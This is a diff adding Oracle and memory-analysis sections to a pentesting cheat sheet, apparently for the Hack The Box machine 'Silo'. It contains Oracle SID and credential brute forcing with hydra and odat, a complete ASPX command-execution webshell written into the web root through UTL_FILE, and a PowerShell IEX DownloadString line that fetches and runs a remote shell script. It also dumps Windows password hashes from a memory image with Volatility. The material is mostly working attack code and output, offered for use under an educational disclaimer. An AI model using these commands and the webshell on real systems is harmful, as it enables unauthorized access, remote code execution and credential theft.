@@ -28,6 +28,8 @@
 26. [OSINT](#OSINT) 
 28. [WebDAV](#WebDAV)
 29. [PowerShell](#PowerShell)
+30. [Oracle](#Oracle)
+31. [Memory Analysis](#Memory-Analysis)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -1121,7 +1123,6 @@ dr
 
 # reload program
 ood
-
 ```
 
 ## Malware Analysis
@@ -1230,5 +1231,219 @@ Get-Item -Path file.exe -Stream *
 
 wmic process call create $(Resolve-Path file.exe:streamname)
 ```
+
+## Encode Base64
+```
+$FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
+$data = Get-Content $Filename
+$data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
+[System.Convert]::ToBase64String($data_utf8)
+```
+
+# Oracle
+## nmap version scan
+```
+nmap -sV -p 1521 10.10.10.82 --script "oracle-tns-version"
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:00 CET
+Nmap scan report for silo.htb (10.10.10.82)
+Host is up (0.097s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
+```
+## nmap SID brute force
+```
+nmap -sV -p 1521 10.10.10.82 --script "oracle-sid-brute"
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:33 CET
+Nmap scan report for silo.htb (10.10.10.82)
+Host is up (0.096s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute: 
+|_  XE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2703.94 seconds
+
+```
+
+## hydra SID brute force
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 18:30:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task
+[DATA] attacking oracle-sid://10.10.10.82:1521/
+[1521][oracle-sid] host: 10.10.10.82   login: XE
+[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
+[STATUS] 496.00 tries/min, 496 tries in 00:01h, 80 to do in 00:01h, 16 active
+[1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
+[1521][oracle-sid] host: 10.10.10.82
+1 of 1 target successfully completed, 4 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 18:31:35
+```
+
+## odat
+* see: https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
+* install odat
+```
+pip3 install cx_Oracle
+git clone https://github.com/quentinhardy/odat.git
+cd odat
+```
+* bruteforce credentials
+```
+python3 odat.py all -s 10.10.10.82 -p 1521 -d XE
+
+[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (10.10.10.82:1521): Searching valid accounts on the XE SID
+
+[+] Valid credentials found: scott/tiger. Continue... 
+```
+
+## Log in to Oracle DB with credentials
+### install sqlplus
+1. create /opt/oracle
+2. download basic, sqlplus and sdk from [here](http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html)
+3. unzip
+4. create symlink (adjust version number!): ```ln libclntsh.so.12.1 libclntsh.so``` and run ```ldconfig```
+5. add the following to /etc/profile or .bashrc/.zshrc (adjust version number!):
+```
+export PATH=$PATH:/opt/oracle/instantclient_12_1
+export SQLPATH=/opt/oracle/instantclient_12_1
+export TNS_ADMIN=/opt/oracle/instantclient_12_1
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
+export ORACLE_HOME=/opt/oracle/instantclient_12_1
+```
+6. add oracle libraries to ldconfig:
+```
+echo "/opt/oracle/instantclient_12_1/" >> /etc/ld.so.conf.d/99_oracle
+```
+7. done, now run ```sqlplus <username>/<password>@<ip_address>/<SID>;```
+
+
+### oracle commands
+* show users: ```SQL> SELECT USERNAME FROM ALL_USERS ORDER BY USERNAME;```
+* show tables: ``` SELECT owner, table_name FROM all_tables;```
+
+## get reverse shell from oracle command line
+* connect to oracle DB. make sure to use 'as sysdba' if possible!
+```
+sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';
+```
+* oracle command line allows to write file. see [here](http://psoug.org/snippet/UTL_FILE-file-write-to-file-example_538.htm?)
+* run the following 'query' to upload an aspx webshell
+```
+declare
+  filehandler UTL_FILE.FILE_TYPE;
+begin
+  filehandler := UTL_FILE.FOPEN('C:/inetpub/wwwroot', 'mfu.aspx', 'W');
+  UTL_FILE.PUTF(filehandler, '<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write("</pre>");
+}
+</script>
+<HTML>
+<HEAD>
+<title>awen asp.net webshell</title>
+</HEAD>
+<body >
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
+</form>
+</body>
+</HTML>
+');
+  UTL_FILE.FCLOSE(filehandler);
+end;     
+```
+* now browse to http://10.10.10.82/mfu.aspx and run commands
+* setup webserver with powershell script and a listener
+```
+powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.29:8000/shell.ps1')"
+
+```
+
+# Memory Analysis
+## .dmp file
+* see https://www.aldeid.com/wiki/Volatility/Retrieve-password
+* install volatility
+```
+virtualenv -p /usr/bin/pytohn2.7 venv
+source venv/bin/activate
+pip install pycrypto
+pip install setuptools --upgrade
+sudo apt install python-dev
+pip install pycrpyto
+pip install distorm3
+sudo git clone https://github.com/volatilityfoundation/volatility
+cd volatility
+sudo python setup.py install
+python vol.py -h
+```
+* get memory address (hivelist)
+```
+python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
+Volatility Foundation Volatility Framework 2.6.1
+Virtual            Physical           Name
+------------------ ------------------ ----
+0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
+0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
+0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
+0xffffc0000001e000 0x0000000000b65000 [no name]
+0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
+0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
+0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
+0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
+0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
+0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
+0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
+0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
+0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
+0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
+0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
+
+```
+* dump hashes
+```
+python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump 0xffffc00000028000
+Volatility Foundation Volatility Framework 2.6.1
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+```
+
+
 
 
